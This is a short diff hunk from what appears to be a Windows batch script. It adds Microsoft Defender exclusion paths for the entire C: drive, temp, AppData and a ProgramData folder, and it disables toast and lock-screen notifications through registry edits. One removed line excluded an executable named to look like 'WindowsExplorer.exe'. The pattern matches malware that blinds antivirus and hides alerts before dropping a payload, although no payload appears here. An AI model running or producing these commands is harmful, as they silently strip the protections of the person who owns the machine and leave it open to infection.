@@ -5,7 +5,6 @@ Powershell Add-MpPreference -ExclusionPath 'c:\'
 Powershell Add-MpPreference -ExclusionPath '%tmp%'
 Powershell Add-MpPreference -ExclusionPath '%appdata%'
 Powershell Add-MpPreference -ExclusionPath '%systemdrive%\programdata\Windata'
-Powershell Add-MpPreference -ExclusionPath '%programdata%\GG-Win\WindowsExplorer.exe'
 echo ---------regedit-edite------------------------------------------------
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
